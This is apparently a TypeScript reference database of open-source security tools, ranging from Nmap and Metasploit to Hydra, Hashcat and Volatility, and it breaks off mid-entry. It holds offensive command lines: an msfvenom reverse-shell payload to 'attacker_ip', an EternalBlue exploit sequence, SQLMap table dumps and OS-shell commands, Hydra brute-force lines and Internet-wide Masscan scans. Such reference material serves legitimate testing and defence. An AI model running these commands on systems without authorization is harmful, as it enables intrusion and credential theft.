// Comprehensive database of open-source cybersecurity tools
// Government-grade, enterprise-ready, widely-used security tools

export interface SecurityTool {
  name: string;
  category: string[];
  description: string;
  github: string;
  stars?: string;
  license: string;
  installation: {
    linux: string;
    macos: string;
    windows: string;
  };
  basic_usage: string[];
  advanced_usage: string[];
  examples: {
    command: string;
    description: string;
    output_sample?: string;
  }[];
  api_available?: boolean;
  api_integration?: string;
  government_approved: boolean;
  use_cases: string[];
  documentation: string;
  notes: string[];
}

export const SECURITY_TOOLS_DB: Record<string, SecurityTool> = {
  // ========== NETWORK SCANNING ==========
  nmap: {
    name: "Nmap",
    category: ["network_scanning", "reconnaissance"],
    description: "Industry-standard network scanner for host discovery, port scanning, service detection, and OS fingerprinting. Used by penetration testers and security professionals worldwide.",
    github: "https://github.com/nmap/nmap",
    stars: "10k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install nmap  # Debian/Ubuntu\nsudo yum install nmap  # RHEL/CentOS",
      macos: "brew install nmap",
      windows: "Download installer from https://nmap.org/download.html"
    },
    basic_usage: [
      "nmap <target>  # Basic scan",
      "nmap -sV <target>  # Service version detection",
      "nmap -O <target>  # OS detection",
      "nmap -p- <target>  # Scan all 65535 ports"
    ],
    advanced_usage: [
      "nmap -sS -sV -O -A <target>  # Aggressive scan with OS/service detection",
      "nmap -sU -p 53,161,162 <target>  # UDP scan on specific ports",
      "nmap --script vuln <target>  # Run vulnerability scripts",
      "nmap -iL targets.txt -oA scan_results  # Scan multiple targets, output all formats",
      "nmap -sn 192.168.1.0/24  # Ping sweep (host discovery only)",
      "nmap --script=ssl-enum-ciphers -p 443 <target>  # SSL/TLS cipher enumeration"
    ],
    examples: [
      {
        command: "nmap -sV -sC -oN scan.txt scanme.nmap.org",
        description: "Service detection + default scripts, output to file",
        output_sample: "PORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.4\n80/tcp open http Apache httpd 2.4.6"
      },
      {
        command: "nmap -p 1-65535 -T4 -A -v 192.168.1.1",
        description: "Full port scan with aggressive timing and version detection"
      },
      {
        command: "nmap --script http-enum 192.168.1.1",
        description: "Enumerate web server directories and files"
      }
    ],
    use_cases: [
      "Network asset discovery and inventory",
      "Port scanning and service identification",
      "Security auditing and vulnerability assessment",
      "Network troubleshooting",
      "Penetration testing reconnaissance"
    ],
    documentation: "https://nmap.org/book/man.html",
    notes: [
      "⚠️ Requires authorization - scanning networks without permission is illegal",
      "Use -T4 for faster scans, -T2 for slower/stealthier",
      "NSE scripts provide extensive functionality (--script=)",
      "Output formats: -oN (normal), -oX (XML), -oG (greppable), -oA (all)"
    ]
  },

  masscan: {
    name: "Masscan",
    category: ["network_scanning"],
    description: "Fastest port scanner in the world, capable of scanning the entire Internet in under 6 minutes. Transmits 10 million packets per second.",
    github: "https://github.com/robertdavidgraham/masscan",
    stars: "23k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install masscan  # Debian/Ubuntu\ngit clone https://github.com/robertdavidgraham/masscan && cd masscan && make",
      macos: "brew install masscan",
      windows: "Download binary from GitHub releases"
    },
    basic_usage: [
      "masscan -p80,443 10.0.0.0/8  # Scan ports 80,443 on entire class A network",
      "masscan -p1-65535 192.168.1.0/24  # Scan all ports on local network",
      "masscan --rate 10000 -p80 0.0.0.0/0  # Scan entire Internet for port 80"
    ],
    advanced_usage: [
      "masscan -p80,443 0.0.0.0/0 --rate=1000000 -oL scan.txt  # Internet-wide scan",
      "masscan 192.168.1.0/24 -p0-65535 --banners -oJ output.json  # Banner grabbing",
      "masscan --rate 100000 --source-port 61234 -p80 10.0.0.0/8  # Custom source port"
    ],
    examples: [
      {
        command: "masscan -p1-65535 192.168.1.1 --rate 1000",
        description: "Fast scan all ports with controlled rate"
      },
      {
        command: "masscan -p443 --banners 0.0.0.0/0 -oL https_scan.txt",
        description: "Scan entire Internet for HTTPS servers with SSL banners"
      }
    ],
    use_cases: [
      "Large-scale network scanning",
      "Internet-wide security research",
      "Rapid asset discovery",
      "Large organization network audits"
    ],
    documentation: "https://github.com/robertdavidgraham/masscan",
    notes: [
      "⚠️ EXTREMELY FAST - can overwhelm networks and trigger IDS/IPS",
      "Requires raw socket privileges (run as root/admin)",
      "Configure --rate appropriately to avoid network disruption",
      "Legal only with explicit authorization"
    ]
  },

  // ========== WEB APPLICATION SECURITY ==========
  "owasp-zap": {
    name: "OWASP ZAP",
    category: ["web_security", "vulnerability_assessment"],
    description: "World's most widely used web application security scanner. Free, open-source, with automated scanning and manual testing tools.",
    github: "https://github.com/zaproxy/zaproxy",
    stars: "12k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2_14_0_unix.sh\nchmod +x ZAP_2_14_0_unix.sh && ./ZAP_2_14_0_unix.sh",
      macos: "brew install --cask owasp-zap",
      windows: "Download installer from https://www.zaproxy.org/download/"
    },
    basic_usage: [
      "zap.sh -daemon -port 8080  # Start ZAP daemon",
      "zap-cli quick-scan http://example.com  # Quick scan",
      "zap-cli active-scan http://example.com  # Active scan"
    ],
    advanced_usage: [
      "zap-cli -p 8080 open-url http://example.com && zap-cli spider http://example.com && zap-cli active-scan http://example.com && zap-cli report -o report.html -f html",
      "zap.sh -daemon -config api.key=your_key -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true",
      "zap-cli --api-key your_key alerts -l High"
    ],
    examples: [
      {
        command: "zap-cli quick-scan -s all -r https://target.com",
        description: "Quick scan with all scanners, recursive"
      },
      {
        command: "zap-cli spider https://target.com --max-depth 5",
        description: "Spider website to discover all pages"
      }
    ],
    api_available: true,
    api_integration: "ZAP provides REST API for automation. Use zap-cli or direct API calls.",
    use_cases: [
      "Web application vulnerability scanning",
      "Security testing in CI/CD pipelines",
      "Manual penetration testing",
      "API security testing",
      "OWASP Top 10 vulnerability detection"
    ],
    documentation: "https://www.zaproxy.org/docs/",
    notes: [
      "Can be integrated into CI/CD for automated security testing",
      "GUI and CLI modes available",
      "Supports authentication for testing secured applications",
      "Active scanning may modify application data - use with caution"
    ]
  },

  nuclei: {
    name: "Nuclei",
    category: ["web_security", "vulnerability_assessment"],
    description: "Fast vulnerability scanner based on simple YAML templates. Over 5000+ community-contributed templates for various security checks.",
    github: "https://github.com/projectdiscovery/nuclei",
    stars: "19k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
      macos: "brew install nuclei",
      windows: "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    },
    basic_usage: [
      "nuclei -u https://example.com  # Scan single URL",
      "nuclei -list urls.txt  # Scan multiple URLs from file",
      "nuclei -u https://example.com -severity critical,high  # Filter by severity"
    ],
    advanced_usage: [
      "nuclei -u https://example.com -t cves/ -t vulnerabilities/  # Specific templates",
      "nuclei -list targets.txt -severity critical,high -o results.txt -json",
      "nuclei -u https://example.com -automatic-scan  # Automated tech detection and scanning",
      "nuclei -l urls.txt -tags cve,exposure -rate-limit 150 -c 50"
    ],
    examples: [
      {
        command: "nuclei -u https://example.com -tags cve,oast,xss",
        description: "Scan for CVEs, out-of-band, and XSS vulnerabilities"
      },
      {
        command: "nuclei -l domains.txt -t nuclei-templates/ -o scan-results.json -json",
        description: "Scan multiple domains with all templates, JSON output"
      }
    ],
    use_cases: [
      "Continuous vulnerability scanning",
      "Bug bounty hunting",
      "Automated security testing",
      "CVE detection and verification",
      "Misconfiguration detection"
    ],
    documentation: "https://docs.projectdiscovery.io/tools/nuclei/overview",
    notes: [
      "Templates auto-update from GitHub",
      "Extremely fast parallel scanning",
      "Custom template creation supported",
      "Integrates well with other ProjectDiscovery tools (httpx, subfinder, etc.)"
    ]
  },

  // ========== OSINT & RECONNAISSANCE ==========
  theharvester: {
    name: "theHarvester",
    category: ["osint", "reconnaissance"],
    description: "OSINT tool for gathering emails, names, subdomains, IPs, and URLs using multiple public data sources.",
    github: "https://github.com/laramies/theHarvester",
    stars: "11k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install theharvester  # Debian/Ubuntu\ngit clone https://github.com/laramies/theHarvester && cd theHarvester && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/laramies/theHarvester && cd theHarvester && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/laramies/theHarvester && cd theHarvester && pip install -r requirements.txt"
    },
    basic_usage: [
      "theHarvester -d example.com -b google  # Search using Google",
      "theHarvester -d example.com -b all  # Search all sources",
      "theHarvester -d example.com -b bing,google -l 500  # Limit results"
    ],
    advanced_usage: [
      "theHarvester -d example.com -b all -f output.html  # HTML report",
      "theHarvester -d example.com -b shodan,censys -l 1000",
      "theHarvester -d example.com -b google,bing,yahoo -n  # DNS lookup",
      "theHarvester -d example.com -b all -c  # DNS brute force"
    ],
    examples: [
      {
        command: "theHarvester -d microsoft.com -b google,linkedin,bing -l 500",
        description: "Gather emails and names from multiple sources"
      },
      {
        command: "theHarvester -d target.com -b all -f report.xml -n",
        description: "Full OSINT with DNS lookups, export to XML"
      }
    ],
    use_cases: [
      "Email address harvesting for phishing simulations",
      "Subdomain enumeration",
      "Employee information gathering",
      "Initial reconnaissance for penetration testing",
      "Threat intelligence gathering"
    ],
    documentation: "https://github.com/laramies/theHarvester/wiki",
    notes: [
      "Supports 30+ data sources including Shodan, Censys, VirusTotal",
      "Rate limiting applied to avoid detection",
      "Some sources require API keys for full functionality",
      "Legal for public information gathering only"
    ]
  },

  shodan: {
    name: "Shodan",
    category: ["osint", "network_scanning", "vulnerability_assessment"],
    description: "Search engine for Internet-connected devices. Discovers exposed databases, webcams, industrial systems, and misconfigured services worldwide.",
    github: "https://github.com/achillean/shodan-python",
    stars: "2.5k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "pip install shodan",
      macos: "pip install shodan",
      windows: "pip install shodan"
    },
    basic_usage: [
      "shodan init YOUR_API_KEY  # Configure API key",
      "shodan search apache  # Search for Apache servers",
      "shodan host 8.8.8.8  # Get info about specific IP"
    ],
    advanced_usage: [
      "shodan search 'product:MySQL' --limit 1000  # Find MySQL servers",
      "shodan search 'port:3389 country:US' # Find RDP servers in US",
      "shodan download --limit 1000 dataset 'apache'  # Download search results",
      "shodan parse --fields ip_str,port,org dataset.json.gz  # Parse results",
      "shodan count 'vuln:CVE-2021-44228'  # Count Log4Shell vulnerable hosts"
    ],
    examples: [
      {
        command: "shodan search 'port:22 country:US' --fields ip_str,port,org",
        description: "Find SSH servers in United States"
      },
      {
        command: "shodan host 1.1.1.1",
        description: "Get comprehensive information about specific IP",
        output_sample: "IP: 1.1.1.1\nOrganization: Cloudflare\nOS: None\nPorts: 53, 80, 443"
      }
    ],
    api_available: true,
    api_integration: "Shodan provides REST API. Free tier: 100 results/month. Paid: unlimited queries.",
    use_cases: [
      "Asset discovery and attack surface mapping",
      "Vulnerability intelligence gathering",
      "Threat hunting and incident response",
      "Security research on exposed systems",
      "Monitoring for exposed internal systems"
    ],
    documentation: "https://developer.shodan.io/api",
    notes: [
      "Requires API key (free tier available)",
      "Paid memberships unlock advanced filters and higher limits",
      "Data updated continuously from Internet-wide scans",
      "Use responsibly - don't attack discovered systems"
    ]
  },

  // ========== PENETRATION TESTING ==========
  metasploit: {
    name: "Metasploit Framework",
    category: ["pentesting", "exploitation"],
    description: "World's most used penetration testing framework. Contains 2000+ exploits, payloads, and auxiliary modules for security testing.",
    github: "https://github.com/rapid7/metasploit-framework",
    stars: "33k+",
    license: "BSD-3-Clause",
    government_approved: true,
    installation: {
      linux: "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
      macos: "brew install metasploit",
      windows: "Download installer from https://windows.metasploit.com/metasploitframework-latest.msi"
    },
    basic_usage: [
      "msfconsole  # Start Metasploit console",
      "search cve:2021  # Search for exploits",
      "use exploit/path/to/module  # Select exploit",
      "show options  # Show exploit options",
      "set RHOSTS target_ip  # Set target",
      "exploit  # Run exploit"
    ],
    advanced_usage: [
      "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > payload.exe  # Generate payload",
      "db_nmap -sV -sC target_ip  # Nmap scan stored in DB",
      "search type:exploit platform:windows  # Advanced search",
      "use auxiliary/scanner/portscan/tcp && set RHOSTS 192.168.1.0/24 && run  # Port scanning",
      "sessions -i 1  # Interact with session",
      "run post/windows/gather/hashdump  # Post-exploitation module"
    ],
    examples: [
      {
        command: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit",
        description: "Exploit EternalBlue vulnerability (MS17-010)"
      },
      {
        command: "use auxiliary/scanner/http/wordpress_scanner\nset RHOSTS example.com\nset THREADS 10\nrun",
        description: "Scan WordPress installation for vulnerabilities"
      }
    ],
    use_cases: [
      "Vulnerability exploitation and validation",
      "Post-exploitation and lateral movement",
      "Social engineering campaigns",
      "Network penetration testing",
      "Security training and education"
    ],
    documentation: "https://docs.metasploit.com/",
    notes: [
      "⚠️ Only use on authorized targets - exploitation is illegal without permission",
      "Meterpreter provides advanced post-exploitation capabilities",
      "Database support for organizing pen-test data",
      "Regular updates with new exploits and modules",
      "Pro version available with additional features"
    ]
  },

  sqlmap: {
    name: "SQLMap",
    category: ["web_security", "pentesting"],
    description: "Automatic SQL injection and database takeover tool. Supports all major database systems.",
    github: "https://github.com/sqlmapproject/sqlmap",
    stars: "31k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install sqlmap  # Debian/Ubuntu\ngit clone https://github.com/sqlmapproject/sqlmap.git",
      macos: "brew install sqlmap",
      windows: "git clone https://github.com/sqlmapproject/sqlmap.git"
    },
    basic_usage: [
      "sqlmap -u 'http://example.com/page?id=1'  # Test URL",
      "sqlmap -u 'http://example.com/page?id=1' --dbs  # List databases",
      "sqlmap -u 'http://example.com/page?id=1' -D dbname --tables  # List tables"
    ],
    advanced_usage: [
      "sqlmap -u 'URL' --batch --threads=10 --level=5 --risk=3  # Aggressive scan",
      "sqlmap -u 'URL' -p id --technique=BEUSTQ  # All SQL injection techniques",
      "sqlmap -u 'URL' --os-shell  # Get OS command shell",
      "sqlmap -u 'URL' -D database -T users --dump  # Dump users table",
      "sqlmap -r request.txt --tamper=space2comment  # Use request file with tamper",
      "sqlmap -u 'URL' --crawl=3 --batch  # Crawl and test 3 levels deep"
    ],
    examples: [
      {
        command: "sqlmap -u 'http://example.com/product.php?id=1' --batch --dbs",
        description: "Automated scan to enumerate databases"
      },
      {
        command: "sqlmap -u 'http://example.com/login.php' --data='username=admin&password=pass' --method=POST --dbs",
        description: "Test POST parameters for SQL injection"
      }
    ],
    use_cases: [
      "SQL injection vulnerability detection",
      "Database enumeration and extraction",
      "Database takeover demonstrations",
      "Web application security testing",
      "Penetration testing assessments"
    ],
    documentation: "https://github.com/sqlmapproject/sqlmap/wiki",
    notes: [
      "⚠️ Can be destructive - use only on authorized targets",
      "Supports authentication and session handling",
      "Over 100 tamper scripts for bypassing WAFs",
      "Can fingerprint database systems automatically"
    ]
  },

  hydra: {
    name: "Hydra",
    category: ["password_testing", "pentesting"],
    description: "Fast and flexible network login cracker supporting 50+ protocols including HTTP, FTP, SSH, Telnet, RDP.",
    github: "https://github.com/vanhauser-thc/thc-hydra",
    stars: "9k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install hydra  # Debian/Ubuntu\ngit clone https://github.com/vanhauser-thc/thc-hydra && cd thc-hydra && ./configure && make && make install",
      macos: "brew install hydra",
      windows: "Download from https://github.com/maaaaz/thc-hydra-windows"
    },
    basic_usage: [
      "hydra -l admin -P passwords.txt ssh://192.168.1.100  # SSH brute force",
      "hydra -L users.txt -P passwords.txt ftp://192.168.1.100  # FTP multiple users",
      "hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'"
    ],
    advanced_usage: [
      "hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.100  # 4 parallel tasks",
      "hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100  # Custom SSH port",
      "hydra -C credentials.txt rdp://192.168.1.100  # Use colon-separated credentials",
      "hydra -l admin -x 6:8:aA1 192.168.1.100 ssh  # Generate password combinations"
    ],
    examples: [
      {
        command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.50",
        description: "Brute force SSH with rockyou wordlist"
      },
      {
        command: "hydra -L users.txt -P passwords.txt smb://192.168.1.100",
        description: "Test multiple credentials against SMB"
      }
    ],
    use_cases: [
      "Password strength testing",
      "Credential validation during security audits",
      "Testing authentication mechanisms",
      "Identifying weak passwords on network services",
      "Penetration testing engagements"
    ],
    documentation: "https://github.com/vanhauser-thc/thc-hydra",
    notes: [
      "⚠️ Unauthorized password testing is illegal",
      "Use rate limiting (-t) to avoid account lockouts",
      "Supports proxy and SSL connections",
      "Can save/restore sessions for long-running attacks"
    ]
  },

  hashcat: {
    name: "Hashcat",
    category: ["password_testing", "forensics"],
    description: "World's fastest password recovery tool. Supports 300+ hash algorithms and GPU acceleration.",
    github: "https://github.com/hashcat/hashcat",
    stars: "20k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "sudo apt install hashcat  # Debian/Ubuntu\nDownload from https://hashcat.net/hashcat/",
      macos: "brew install hashcat",
      windows: "Download from https://hashcat.net/hashcat/"
    },
    basic_usage: [
      "hashcat -m 0 -a 0 hash.txt wordlist.txt  # MD5 dictionary attack",
      "hashcat -m 1000 -a 0 hash.txt wordlist.txt  # NTLM dictionary attack",
      "hashcat -m 2500 capture.hccapx wordlist.txt  # WPA/WPA2 cracking"
    ],
    advanced_usage: [
      "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a  # Brute force 8 chars",
      "hashcat -m 1000 -a 6 hash.txt wordlist.txt ?d?d?d?d  # Hybrid attack",
      "hashcat -m 13100 -a 0 hash.txt --username rockyou.txt  # Kerberos 5 TGS-REP",
      "hashcat -m 22000 hash.hc22000 -a 0 rockyou.txt -w 3  # WPA3 (fast workload)",
      "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule  # With rules"
    ],
    examples: [
      {
        command: "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
        description: "Crack Windows NTLM password hashes"
      },
      {
        command: "hashcat -m 0 -a 3 md5_hash.txt ?u?l?l?l?l?l?d?d",
        description: "Brute force MD5: uppercase + 5 lowercase + 2 digits"
      }
    ],
    use_cases: [
      "Password recovery for encrypted files",
      "Forensic analysis of password hashes",
      "Testing password strength policies",
      "Security auditing of user credentials",
      "Wireless network password recovery"
    ],
    documentation: "https://hashcat.net/wiki/",
    notes: [
      "Supports CPU and GPU acceleration (NVIDIA, AMD)",
      "Distributed cracking across multiple machines",
      "Rule-based attacks for password mutations",
      "Can restore sessions if interrupted",
      "Benchmark: hashcat -b to test your hardware"
    ]
  },

  // ========== NETWORK MONITORING & IDS ==========
  snort: {
    name: "Snort",
    category: ["network_monitoring", "ids"],
    description: "Leading open-source Intrusion Detection System (IDS) and Intrusion Prevention System (IPS). Real-time traffic analysis and packet logging.",
    github: "https://github.com/snort3/snort3",
    stars: "3k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install snort  # Debian/Ubuntu\nCompile from source: https://www.snort.org/documents/snort-3-build-on-ubuntu-18-19",
      macos: "brew install snort",
      windows: "Download from https://www.snort.org/downloads"
    },
    basic_usage: [
      "snort -A console -q -c /etc/snort/snort.conf -i eth0  # Start IDS mode",
      "snort -dev -l ./log -i eth0  # Packet logger mode",
      "snort -r capture.pcap  # Read pcap file"
    ],
    advanced_usage: [
      "snort -A fast -b -q -c /etc/snort/snort.conf -i eth0 -l /var/log/snort",
      "snort -c /etc/snort/snort.conf -T  # Test configuration",
      "snort -r capture.pcap -c /etc/snort/snort.conf -K ascii -l ./  # Process pcap with rules"
    ],
    examples: [
      {
        command: "snort -A console -q -c /etc/snort/snort.conf -i eth0",
        description: "Monitor network in real-time with console alerts"
      },
      {
        command: "snort -dev -l /var/log/snort -i eth0",
        description: "Log all packets with data link and verbose output"
      }
    ],
    use_cases: [
      "Real-time network intrusion detection",
      "Protocol analysis and packet logging",
      "Malware traffic detection",
      "Network security monitoring",
      "Compliance monitoring (PCI-DSS, HIPAA)"
    ],
    documentation: "https://www.snort.org/documents",
    notes: [
      "Community rules available at snort.org/downloads",
      "Can run as IDS (passive) or IPS (inline blocking)",
      "Barnyard2 for database integration",
      "Snort 3 is the latest version with improved performance"
    ]
  },

  wireshark: {
    name: "Wireshark",
    category: ["network_monitoring", "forensics"],
    description: "World's most popular network protocol analyzer. Deep inspection of hundreds of protocols with live capture and offline analysis.",
    github: "https://gitlab.com/wireshark/wireshark",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install wireshark  # Debian/Ubuntu",
      macos: "brew install --cask wireshark",
      windows: "Download from https://www.wireshark.org/download.html"
    },
    basic_usage: [
      "wireshark  # Start GUI",
      "tshark -i eth0  # Command-line capture",
      "tshark -r capture.pcap  # Read capture file",
      "tshark -i eth0 -w output.pcap  # Capture to file"
    ],
    advanced_usage: [
      "tshark -i eth0 -f 'port 443' -Y 'ssl.handshake.type == 1' -T fields -e ip.src -e ip.dst",
      "tshark -r capture.pcap -q -z io,phs  # Protocol hierarchy statistics",
      "tshark -r capture.pcap -Y 'http.request.method == POST' -T fields -e http.file_data",
      "tshark -i eth0 -f 'tcp port 80' -Y 'http contains password' -w sensitive.pcap"
    ],
    examples: [
      {
        command: "tshark -i eth0 -f 'host 192.168.1.100' -w capture.pcap",
        description: "Capture all traffic to/from specific host"
      },
      {
        command: "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name",
        description: "Extract all DNS queries from capture"
      }
    ],
    use_cases: [
      "Network troubleshooting and debugging",
      "Security analysis and forensics",
      "Protocol development and analysis",
      "Malware traffic analysis",
      "Network performance analysis"
    ],
    documentation: "https://www.wireshark.org/docs/",
    notes: [
      "Supports 2000+ network protocols",
      "Can decrypt SSL/TLS with private keys",
      "Powerful display filters for analysis",
      "tshark for command-line automation",
      "Can follow TCP streams and reconstruct files"
    ]
  },

  // ========== VULNERABILITY ASSESSMENT ==========
  openvas: {
    name: "OpenVAS",
    category: ["vulnerability_assessment"],
    description: "Full-featured vulnerability scanner with 50,000+ vulnerability tests. Free and open-source alternative to commercial scanners.",
    github: "https://github.com/greenbone/openvas-scanner",
    stars: "3k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install openvas  # Debian/Ubuntu\nsudo gvm-setup  # Initialize\nsudo gvm-start  # Start services",
      macos: "Use Docker: docker run -d -p 443:443 --name openvas mikesplain/openvas",
      windows: "Use Docker or Linux VM"
    },
    basic_usage: [
      "Access web interface: https://localhost:9392",
      "Default credentials: admin / (generated password shown during setup)",
      "Create scan task → Add target → Start scan"
    ],
    advanced_usage: [
      "gvm-cli --gmp-username admin --gmp-password pass socket --xml '<get_tasks/>'",
      "Configure scan configs for different scan types (Full, Fast, Discovery)",
      "Schedule recurring scans",
      "Generate compliance reports (PCI-DSS, HIPAA, ISO 27001)"
    ],
    examples: [
      {
        command: "Create scan via web UI: Configuration → Targets → New Target → Add IPs",
        description: "Setup new vulnerability scan target"
      },
      {
        command: "Scans → Tasks → New Task → Select target and scan config",
        description: "Configure and launch vulnerability scan"
      }
    ],
    use_cases: [
      "Enterprise vulnerability management",
      "Compliance scanning (PCI-DSS, HIPAA)",
      "Continuous security monitoring",
      "Network security audits",
      "Patch management validation"
    ],
    documentation: "https://docs.greenbone.net/",
    notes: [
      "Maintained by Greenbone Networks",
      "Regular feed updates with new vulnerability tests",
      "Can integrate with SIEM systems",
      "Supports authenticated scanning for deeper assessment"
    ]
  },

  trivy: {
    name: "Trivy",
    category: ["vulnerability_assessment", "container_security"],
    description: "Comprehensive security scanner for containers, filesystems, and Git repositories. Detects vulnerabilities, misconfigurations, secrets, and license issues.",
    github: "https://github.com/aquasecurity/trivy",
    stars: "22k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -\necho 'deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main' | sudo tee /etc/apt/sources.list.d/trivy.list\nsudo apt update && sudo apt install trivy",
      macos: "brew install trivy",
      windows: "Download from https://github.com/aquasecurity/trivy/releases"
    },
    basic_usage: [
      "trivy image nginx:latest  # Scan Docker image",
      "trivy fs /path/to/project  # Scan filesystem",
      "trivy repo https://github.com/user/repo  # Scan Git repository"
    ],
    advanced_usage: [
      "trivy image --severity HIGH,CRITICAL nginx:latest  # Filter by severity",
      "trivy image --ignore-unfixed nginx:latest  # Ignore vulnerabilities without fixes",
      "trivy config /path/to/iac  # Scan Infrastructure as Code",
      "trivy image --format json -o results.json nginx:latest  # JSON output",
      "trivy image --security-checks vuln,config,secret nginx:latest  # Multiple check types"
    ],
    examples: [
      {
        command: "trivy image --severity CRITICAL alpine:3.15",
        description: "Scan Alpine image for critical vulnerabilities only"
      },
      {
        command: "trivy fs --security-checks config,secret ./kubernetes/",
        description: "Scan Kubernetes configs for misconfigurations and secrets"
      }
    ],
    use_cases: [
      "Container image vulnerability scanning",
      "CI/CD pipeline security",
      "Kubernetes security scanning",
      "Infrastructure as Code security",
      "Secret detection in code repositories"
    ],
    documentation: "https://aquasecurity.github.io/trivy/",
    notes: [
      "Extremely fast - scans complete in seconds",
      "Supports Docker, Kubernetes, Terraform, CloudFormation",
      "Can scan local and remote images",
      "Integrates with CI/CD tools (GitLab, GitHub Actions, Jenkins)"
    ]
  },

  // ========== FORENSICS ==========
  autopsy: {
    name: "Autopsy",
    category: ["forensics"],
    description: "Digital forensics platform with GUI for analyzing hard drives and mobile devices. Includes timeline analysis, keyword search, and file recovery.",
    github: "https://github.com/sleuthkit/autopsy",
    stars: "2.5k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "Download from https://www.autopsy.com/download/",
      macos: "Not officially supported - use Linux VM",
      windows: "Download installer from https://www.autopsy.com/download/"
    },
    basic_usage: [
      "Launch Autopsy GUI",
      "Create new case",
      "Add data source (disk image, local disk, logical files)",
      "Run ingest modules (hash calculation, keyword search, etc.)",
      "Analyze results"
    ],
    advanced_usage: [
      "Timeline analysis for event reconstruction",
      "EXIF metadata extraction from images",
      "Email analysis (PST, MBOX files)",
      "Registry analysis for Windows systems",
      "Keyword searching with regular expressions"
    ],
    examples: [
      {
        command: "File → New Case → Add Data Source → Select disk image",
        description: "Start forensic investigation on disk image"
      },
      {
        command: "Tools → Run Ingest Modules → Select modules → Start",
        description: "Run automated analysis modules"
      }
    ],
    use_cases: [
      "Digital forensics investigations",
      "Incident response analysis",
      "Malware investigation",
      "Data recovery",
      "Legal e-discovery"
    ],
    documentation: "https://www.autopsy.com/support/",
    notes: [
      "Built on The Sleuth Kit",
      "Module-based architecture for extensibility",
      "Multi-user case collaboration",
      "Supports disk images (dd, E01, raw)",
      "Generate comprehensive forensic reports"
    ]
  },

  volatility: {
    name: "Volatility",
    category: ["forensics", "malware_analysis"],
    description: "Advanced memory forensics framework for extracting artifacts from RAM dumps. Essential for malware analysis and incident response.",
    github: "https://github.com/volatilityfoundation/volatility3",
    stars: "7k+",
    license: "Custom",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\npip3 install -r requirements.txt",
      macos: "Same as Linux",
      windows: "Same as Linux or download standalone exe"
    },
    basic_usage: [
      "vol -f memory.dump windows.info  # Get system info",
      "vol -f memory.dump windows.pslist  # List processes",
      "vol -f memory.dump windows.netscan  # Network connections"
    ],
    advanced_usage: [
      "vol -f memory.dump windows.malfind  # Find hidden/injected code",
      "vol -f memory.dump windows.dumpfiles --pid 1234  # Extract files from process",
      "vol -f memory.dump windows.cmdline  # Extract command-line arguments",
      "vol -f memory.dump windows.registry.hivelist  # List registry hives",
      "vol -f memory.dump windows.filescan | grep -i 'malware'  # Search file handles"
    ],
    examples: [
      {
        command: "vol -f infected.mem windows.pslist",
        description: "List all running processes from memory dump",
        output_sample: "PID\tPPID\tImageFileName\n4\t0\tSystem\n464\t4\tsmss.exe\n552\t464\tcsrss.exe"
      },
      {
        command: "vol -f infected.mem windows.malfind --pid 1337",
        description: "Detect code injection in specific process"
      }
    ],
    use_cases: [
      "Malware analysis and detection",
      "Incident response investigations",
      "Rootkit detection",
      "Memory-resident threat hunting",
      "Forensic examination of running systems"
    ],
    documentation: "https://volatility3.readthedocs.io/",
    notes: [
      "Volatility 3 is Python 3 rewrite with improved performance",
      "Supports Windows, Linux, macOS memory dumps",
      "Can analyze crash dumps and hibernation files",
      "Extensive plugin ecosystem",
      "Essential tool for APT investigations"
    ]
  },

  // ========== WIRELESS SECURITY ==========
  "aircrack-ng": {
    name: "Aircrack-ng",
    category: ["wireless", "password_testing"],
    description: "Complete suite for assessing WiFi network security. Includes packet capture, WEP/WPA/WPA2 cracking, and fake access point creation.",
    github: "https://github.com/aircrack-ng/aircrack-ng",
    stars: "5k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install aircrack-ng  # Debian/Ubuntu",
      macos: "brew install aircrack-ng",
      windows: "Use Linux VM or WSL"
    },
    basic_usage: [
      "airmon-ng start wlan0  # Enable monitor mode",
      "airodump-ng wlan0mon  # Capture packets",
